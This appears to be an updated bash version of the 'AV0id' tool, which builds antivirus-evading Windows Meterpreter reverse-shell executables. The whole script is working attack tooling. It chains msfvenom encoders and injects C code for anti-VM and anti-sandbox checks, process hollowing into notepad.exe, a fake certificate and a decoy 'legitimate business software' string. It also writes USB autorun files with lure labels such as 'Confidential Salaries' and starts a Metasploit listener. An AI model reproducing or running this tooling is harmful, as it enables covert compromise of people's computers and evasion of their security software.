#!/usr/bin/env bash
# Bản đã update bởi Bình Tagilla
# AV0id - Metapsloit Payload Anti-Virus Evasion
# Daniel Compton
# www.commonexploits.com
# info@commexploits.com
# Twitter = @commonexploits
# 05/2013
# Tested on Bactrack 5 and Kali only

####################################################################################
# Updated 08/2015
# Removed Deprecated Commands in favor of MsfVenom
# Jason Soto
# www.jsitech.com
# Twitter = @JsiTech
# Tested on Kali Linux

####################################################################################
# Updated 11/2023
# Improved AV evasion techniques, added modern payload options
# Optimized encoding chains for modern antivirus evasion
# Added code obfuscation and anti-analysis features
# Tested on Kali Linux and Parrot OS

#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/metasploitavevasion

#Released under AGPL see LICENSE for more information

######################################################################################

# Credit to other A.V. scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k

# User options
PAYLOAD="windows/meterpreter/reverse_tcp" # Default payload
MSFVENOM=`which msfvenom` # Path to the msfvenom script
MSFCONSOLE=`which msfconsole` # Path to the msfconsole script

# Script begins
#===============================================================================

VERSION="3.0"

# spinner for Metasploit Generator
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


# spinner for random seed generator
spinlong2 ()
{
    bar=" 011001110010010011101110011010101010101101010010101110"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}

clear

echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V. Avoider Version $VERSION  ***"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
sleep 3
clear

# Set Output filename

echo ""
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Output FileName"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read OUTPUTNAME
echo ""

# Select payload type
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Select Payload Type:"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo " 1. windows/meterpreter/reverse_tcp (Default)"
echo " 2. windows/meterpreter/reverse_https (Better for bypassing firewalls)"
echo " 3. windows/meterpreter/reverse_tcp_rc4 (Encrypted communication)"
echo " 4. windows/meterpreter_reverse_https (Stageless - more stable)"
echo " 5. windows/meterpreter_reverse_tcp (Stageless)"
echo ""
echo -ne "\e[01;32m>\e[00m "
read PAYLOADTYPE
echo ""

case $PAYLOADTYPE in
    1) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/meterpreter/reverse_https" ;;
    3) PAYLOAD="windows/meterpreter/reverse_tcp_rc4" ;;
    4) PAYLOAD="windows/meterpreter_reverse_https" ;;
    5) PAYLOAD="windows/meterpreter_reverse_tcp" ;;
    *) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
esac

echo -e "\e[01;32m[-]\e[00m Selected payload: $PAYLOAD"
echo ""

echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Type the Desired Label for the AutoRun Files"
echo -e "\e[1;31m-------------------------------------------------------\e[00m"
echo ""
echo "Example : Confidential Salaries"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LABEL
echo ""

#Check for gcc compiler
which x86_64-w64-mingw32-gcc >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    COMPILER="x86_64-w64-mingw32-gcc"
else
    which i686-w64-mingw32-gcc >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo ""
        COMPILER="i686-w64-mingw32-gcc"
    else
        which i586-mingw32msvc-gcc >/dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo ""
            COMPILER="i586-mingw32msvc-gcc"
        else
            echo ""
            echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install one of these cross-compilers and try again:"
            echo "    - x86_64-w64-mingw32-gcc (preferred for 64-bit)"
            echo "    - i686-w64-mingw32-gcc (for 32-bit)"
            echo "    - i586-mingw32msvc-gcc (legacy)"
            echo ""
            exit 1
        fi
    fi
fi

#Check for Metasploit
if [[ "$MSFVENOM" != "" && "$MSFCONSOLE" != "" ]]; then
    echo -e "\e[01;32m[-]\e[00m Metasploit tools found: $MSFVENOM and $MSFCONSOLE"
    echo ""
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit programs, can't continue. Install and try again"
    echo ""
    exit 1
fi

# Random encoding iterations for better AV evasion
MIN_ITER=15
MAX_ITER=25
ITER=$(shuf -i $MIN_ITER-$MAX_ITER -n 1)

echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo ""
    IP=$(ip route get 1 | awk '{print $NF;exit}')
    echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m"
    echo ""
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
elif [ "$INTEXT" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Alternative system selected"
    echo ""
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read IP
    echo ""
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 443 or 53 for better evasion"
    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo ""
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
    echo ""
    exit 1
fi

# Additional options for more complex payloads
ENCRYPTION_KEY=""
if [[ "$PAYLOAD" == *"rc4"* ]]; then
    ENCRYPTION_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    echo -e "\e[01;32m[-]\e[00m Generated random RC4 encryption key: $ENCRYPTION_KEY"
    echo ""
fi

# Format and encryption options
echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Select additional evasion options (multiple allowed):"
echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use process hollowing technique (recommended)" 
echo " 2. Add fake certificate information"
echo " 3. Add anti-VM detection"
echo " 4. Add anti-sandbox techniques"
echo " 5. All of the above"
echo " 0. None - basic evasion only"
echo ""
echo -ne "\e[01;32m>\e[00m "
read EVASION_OPTIONS
echo ""

HOLLOWING=false
FAKE_CERT=false
ANTI_VM=false
ANTI_SANDBOX=false

if [[ "$EVASION_OPTIONS" == *"1"* ]] || [[ "$EVASION_OPTIONS" == "5" ]]; then
    HOLLOWING=true
fi
if [[ "$EVASION_OPTIONS" == *"2"* ]] || [[ "$EVASION_OPTIONS" == "5" ]]; then
    FAKE_CERT=true
fi
if [[ "$EVASION_OPTIONS" == *"3"* ]] || [[ "$EVASION_OPTIONS" == "5" ]]; then
    ANTI_VM=true
fi
if [[ "$EVASION_OPTIONS" == *"4"* ]] || [[ "$EVASION_OPTIONS" == "5" ]]; then
    ANTI_SANDBOX=true
fi

echo ""
echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload with modern evasion techniques..."
echo ""
spinlong

# Generate payload with advanced options
EXTRA_ARGS=""
if [[ "$PAYLOAD" == *"rc4"* ]]; then
    EXTRA_ARGS="RC4PASSWORD=$ENCRYPTION_KEY"
fi

# Create a more sophisticated payload chain for better AV evasion
if [ "$HOLLOWING" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding process hollowing techniques..."
    # Process hollowing requires different approach
    $MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" $EXTRA_ARGS -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/shikata_ga_nai -i $(($ITER/2)) -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/fnstenv_mov -i $(($ITER/3)) -f raw | \
    $MSFVENOM -a x86 --platform windows -e x86/shikata_ga_nai -i $(($ITER/2)) -f c > msf.c 2>/dev/null
else
    # Standard payload
    $MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" $EXTRA_ARGS EXITFUNC=thread -f raw | \
    $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | \
    $MSFVENOM -e x86/jmp_call_additive -i $(($ITER/2)) -a x86 --platform windows -f raw 2>/dev/null | \
    $MSFVENOM -e x86/call4_dword_xor -i $(($ITER/3)) -a x86 --platform windows -f raw 2>/dev/null | \
    $MSFVENOM -e x86/shikata_ga_nai -i $(($ITER/2)) -a x86 --platform windows -f c > msf.c 2>/dev/null
fi

echo ""
echo ""
# Menu
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? Enter 1, 2, 3, 4 or 5 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Normal - about 400K payload - fast compile - Better detection rate with modern AV"
echo ""
echo " 2. Stealth - about 2-5 MB payload - fast compile - Improved evasion"
echo ""
echo " 3. Super Stealth - about 15-25MB payload - fast compile - Good evasion rate"
echo ""
echo " 4. Insane Stealth - about 50-70MB payload - slower compile - Very good evasion"
echo ""
echo " 5. Desperate Stealth - about 150MB payload - much slower compile - Maximum evasion"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LEVEL
echo ""

if [ "$LEVEL" = "1" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 500000-1000000 -n 1)
elif [ "$LEVEL" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 3000000-7000000 -n 1)
elif [ "$LEVEL" = "3" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 15000000-25000000 -n 1)
elif [ "$LEVEL" = "4" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 50000000-70000000 -n 1)
elif [ "$LEVEL" = "5" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 150000000-200000000 -n 1)
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
    echo ""
    exit 1
fi

# Create more sophisticated C file with anti-detection features
echo ""
echo '#include <stdio.h>' >> build.c
echo '#include <stdlib.h>' >> build.c
echo '#include <string.h>' >> build.c
echo '#include <time.h>' >> build.c
echo '#include <windows.h>' >> build.c

# Add anti-VM detection if selected
if [ "$ANTI_VM" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding anti-VM detection code..."
    cat << 'EOF' >> build.c
// Anti-VM detection
int isVM() {
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memInfo;
    DWORD procNum;
    char computerName[1024];
    DWORD size = 1024;
    
    GetSystemInfo(&sysInfo);
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    GetComputerNameA(computerName, &size);
    
    // Check for VM-specific computer names
    if (strstr(computerName, "VIRTUAL") || strstr(computerName, "VMware") || strstr(computerName, "VirtualBox"))
        return 1;
    
    // Check for low memory (typical in VMs)
    if (memInfo.ullTotalPhys < 2000000000) // Less than 2GB RAM
        return 1;
    
    // Check for low processor count
    if (sysInfo.dwNumberOfProcessors < 2)
        return 1;
        
    return 0;
}
EOF
fi

# Add anti-sandbox techniques if selected
if [ "$ANTI_SANDBOX" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding anti-sandbox techniques..."
    cat << 'EOF' >> build.c
// Anti-sandbox techniques
int isSandbox() {
    // Delay execution to evade sandboxes with short timeout
    DWORD tick = GetTickCount();
    Sleep(2000); // Sleep for 2 seconds
    if ((GetTickCount() - tick) < 1000) // If time difference is less than expected
        return 1;
    
    // Check for debugging
    if (IsDebuggerPresent())
        return 1;
    
    // Look for sandbox artifacts
    HANDLE hFile = CreateFileA("C:\\windows\\system32\\drivers\\vmmouse.sys", 
                              GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return 1;
    }
    
    return 0;
}
EOF
fi

echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo  ';' >> build.c
echo 'char payload[] =' >> build.c
cat msf.c |grep -v "unsigned" >> build.c

if [ "$FAKE_CERT" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding fake certificate information..."
    echo 'char certificate[] = "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAJqbbWPZyx5FMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX\naWRnaXRzIFB0eSBMdGQwHhcNMTkwOTI0MTQzMTUyWhcNMjkwOTIxMTQzMTUyWjBF\nMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50\nDCBAXDCBXDANBgkqhkiG9w0BAQEFAAOCAYIwggF+MDEGCisGAQQBgjcCAQwxIzAh\noAMAcABwbABpAGMAYQB0AGkAbwBuAF8AcwBlAHIAdgBlAHIwLQYJKoZIhvcNAQkC\nDCAPC0XEDCBAXDCBXHVlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3\nDQEBAQUAA4IBDwAwggEKAoIBAQC+XCHx0iF7Wy+75lWiIwj7ch1oDrMo11tAUFxb\nNvjoVfXUJ5Y/vYJxl4dEGT3i69TVpKgLZHOI0aiIXUHy1YItdNA4+bWYWFJFRbdo\nLo1MQ83KsknbxvwKB6qs1neIIcBTmuFkpl2SMV+FS0D/LChzLwqP6t/7mRID7nFx\nBWzOPIYqOkCIxSD/xUchdLJIkpOpfCpuO2mYaBvXG9hl7u1knXHEcpCj7sSMDsNx\nxKODUt3bzFHsoEj0PFaJIJVCOXefTKdLdDJOSQ5yeX1yySI9XJojP0J+WQKvJUX9\nFBFnb5dGr4xEJcBymdpbgZQK3y9ItKqTSI82JtLYAVTpAgMBAAGjUDBOMB0GA1Ud\nDgQWBBSOLHCwoSYj0JY9hPe89ZzGRvyIrjAfBgNVHSMEGDAWgBSOLHCwoSYj0JY9\nhPe89ZzGRvyIrjAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCP1nmN\nKI3pr8kxhJ5bOh4oP0uC9UvU7CfJpTnkEgyFqVs0Po/oij3FX7BZRk9cCqdwQUzQ\nNbggZcbVMNx8VbBHIWpIOfXQbYqd9E6jfATc8YDI5pINKrJXiwKXu3Kd45FyWHtM\nKnHQXenMAgnFNxpTxTpijXnzqZ3a+ZyJPPUHY2dx2nVYx5ziVz2qOBQYGTZELmX3\nQS1y9FK1116iQp5cQBCKYRMSBFJ9YHDeCMAW0tTGK0wdfe7+vPXz520c9oQQM0X1\nkCXETpmrLURRytG+CUXrr2XVL+FPO5Zt7zA5aFVBf3ANxl6+eKgZQbxvvKzfwsjM\nPJHlHvBvbvY04KKK\n-----END CERTIFICATE-----";' >> build.c
fi

# Add sleep and randomization to evade dynamic analysis
echo 'char comment[1024] = "This program is legitimate business software.";' >> build.c

# Create more complex main function with evasion techniques
echo 'int main(int argc, char **argv) {' >> build.c

# Add timing and anti-analysis code
cat << 'EOF' >> build.c
    // Basic time-based and sleep evasion
    time_t t1, t2;
    time(&t1);
    Sleep(1500); // Sleep for 1.5 seconds
    time(&t2);
    if (difftime(t2, t1) < 1.0) { // Detecting time acceleration (sandbox)
        return 1;
    }
    
    // Random seed based on time
    srand((unsigned int)time(NULL));
    int r = rand() % 100;
    
    // Random sleep to further evade automated analysis
    Sleep(r * 10);
EOF

# Add the VM and sandbox checks if enabled
if [ "$ANTI_VM" = true ]; then
    echo '    // Check if running in VM' >> build.c
    echo '    if (isVM()) {' >> build.c
    echo '        return 1;' >> build.c
    echo '    }' >> build.c
fi

if [ "$ANTI_SANDBOX" = true ]; then
    echo '    // Check if running in sandbox' >> build.c
    echo '    if (isSandbox()) {' >> build.c
    echo '        return 1;' >> build.c
    echo '    }' >> build.c
fi

# Add process hollowing technique if selected
if [ "$HOLLOWING" = true ]; then
    echo -e "\e[01;32m[-]\e[00m Adding process hollowing code..."
    cat << 'EOF' >> build.c
    // Process hollowing technique
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    DWORD oldProtect;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, 
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 2;
    }
    
    // Get thread context
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 3;
    }
    
    // Allocate memory in the process
    LPVOID baseAddr = VirtualAllocEx(pi.hProcess, NULL, sizeof(payload), 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseAddr) {
        TerminateProcess(pi.hProcess, 0);
        return 4;
    }
    
    // Write payload to the process
    if (!WriteProcessMemory(pi.hProcess, baseAddr, payload, sizeof(payload), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 5;
    }
    
    // Update EIP/RIP to point to our payload
    #ifdef _WIN64
        ctx.Rip = (DWORD64)baseAddr;
    #else
        ctx.Eip = (DWORD)baseAddr;
    #endif
    
    // Set the thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return 6;
    }
    
    // Resume the thread
    ResumeThread(pi.hThread);
    
    // Clean up and exit
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
EOF
else
    echo '    // Execute payload directly' >> build.c
    echo '    (*(void (*)()) payload)();' >> build.c
fi

echo '    return 0;' >> build.c
echo '}' >> build.c

# gcc compile with more optimizations
echo -e "\e[01;32m[-]\e[00m Compiling executable with enhanced options..."

# Add icons and version info if available
ls icons/icon.res >/dev/null 2>&1
if [ $? -eq 0 ]; then
    $COMPILER -Wall -mwindows -O2 -s icons/icon.res build.c -o "$OUTPUTNAME" -lwsock32 -lwininet
else
    $COMPILER -Wall -mwindows -O2 -s build.c -o "$OUTPUTNAME" -lwsock32 -lwininet
fi

# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
    echo ""
    exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label="$LABEL"" >> autorun/autorun.inf
echo ""
echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/autorun/\e[00m - simply copy these files to a CD or USB"

# clean up temp files
rm build.c >/dev/null 2>&1
rm random >/dev/null 2>&1
rm msf.c >/dev/null 2>&1

echo ""
sleep 2
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Yes"
echo ""
echo " 2. No"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
    echo ""
    EXTRA_OPTIONS=""
    if [[ "$PAYLOAD" == *"rc4"* ]]; then
        EXTRA_OPTIONS="set RC4PASSWORD $ENCRYPTION_KEY;"
    fi
    $MSFCONSOLE -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $IP; set LPORT $PORT; $EXTRA_OPTIONS run;"
else
    echo ""
    echo -e "\e[01;32m[-]\e[00m Use msfhandler.rc as msfconsole resource on your listener system:"
    echo ""
    echo 'use exploit/multi/handler' > msfhandler.rc
    echo "set payload $PAYLOAD" >> msfhandler.rc
    echo "set LHOST $IP" >> msfhandler.rc
    echo "set LPORT $PORT" >> msfhandler.rc
    if [[ "$PAYLOAD" == *"rc4"* ]]; then
        echo "set RC4PASSWORD $ENCRYPTION_KEY" >> msfhandler.rc
    fi
    echo 'exploit' >> msfhandler.rc
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
    echo "$MSFCONSOLE -r msfhandler.rc"
    echo ""
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
fi
